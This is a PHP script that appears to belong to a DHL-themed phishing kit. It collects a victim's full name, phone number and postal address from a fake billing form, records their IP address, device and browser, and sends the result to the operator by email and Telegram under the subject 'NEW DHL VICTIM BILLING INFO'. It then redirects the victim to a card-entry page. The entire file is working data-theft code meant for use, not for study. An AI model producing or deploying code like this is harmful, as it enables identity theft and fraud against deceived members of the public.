<?php
include("../../system/os.php");
include "../ur_email.php";
include("../../system/tlgrm.php");
include("../../system/get_ip.php");
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['jeanname'] != "") AND ($_POST['jeanadress'] != "") AND ($_POST['jeancountry'] != "") AND ($_POST['jeancity'] != "") AND ($_POST['jeanstate'] != "") AND ($_POST['jeanzip'] != "") AND ($_POST['jeanphone'] != "") )
{
$hostname = gethostbyaddr($ip);
$message .= "+]###############[+] DHL FULLZ [+]###############[+\n";
$message .= "# FULL NAME     : ".$_POST['jeanname']."\n";
$message .= "# PHONE NUMBER  : ".$_POST['jeanphone']."\n";
$message .= "# ADRESS LINE   : ".$_POST['jeanadress']."\n";
$message .= "# Aprtement       : ".$_POST['jeancountry']."\n";
$message .= "# CITY/TOWN     : ".$_POST['jeancity']."\n";
$message .= "# STATE         : ".$_POST['jeanstate']."\n";
$message .= "# ZIP CODE      : ".$_POST['jeanzip']."\n";
$message .= "# COUNTRY:        ".$_SESSION['_LOOKUP_COUNTRY_']."\n";
$message .= "# IP INFO       : $ip\n";
$message .= "# TIME/DATE     : $date\n";
$message .= "# DEVICE        : $user_os\n";
$message .= "# BROWSER       : $user_browser\n";
$message .= "+]###############[+] J E A N [+]###############[+\n";
$send = "$jean_email";
$subject = "📦 NEW DHL VICTIM BILLING INFO FROM = $ip";
$headers = "From: J E A N <dhl@jean8.vip>";
mail($send,$subject,$message,$headers);
telegram($message);
echo "<meta http-equiv='refresh' content='0; url=../../card.php'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; ../../card.php' />";
}

?>